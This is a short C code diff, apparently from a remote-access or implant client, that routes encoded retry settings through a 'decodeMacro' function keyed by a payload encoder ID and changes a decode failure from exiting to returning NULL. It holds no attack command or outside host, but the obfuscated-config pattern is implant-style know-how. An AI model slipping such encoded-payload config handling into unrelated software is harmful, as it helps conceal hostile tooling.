@@ -95,10 +95,10 @@ int main() {
     FreeGoMem(_tmp_retryMethodExponential);
     FreeGoMem(_tmp_retryMethodExponentialJitter);
 
-    char *retryDelayStr = RETRY_DELAY;
+    char *retryDelayStr = decodeMacro(RETRY_DELAY, payloadEncoderID);
     int retryDelay = parseInt(retryDelayStr, 5);
 
-    char *retryAttemptsCapStr = RETRY_ATTEMPTS_CAP;
+    char *retryAttemptsCapStr = decodeMacro(RETRY_ATTEMPTS_CAP, payloadEncoderID);
     int retryAttemptsCap = parseInt(retryAttemptsCapStr, 10);
 
     char *_tmp_histfile = decodeMacro(ENV_HISTFILE, payloadEncoderID);
@@ -662,7 +662,7 @@ int parseInt(char* string, int fallback) {
 char* decodeMacro(char* macroEncoded, int *payloadEncoderID) {
     _go_base64 macroDecodedB64 = _b64_d(macroEncoded);
     if (macroDecodedB64.data == NULL) {
-        _exit(1); // Can't parse smt, quit to avoid trouble
+       return NULL; // Can't parse smt, quit to avoid trouble
 
     }
 
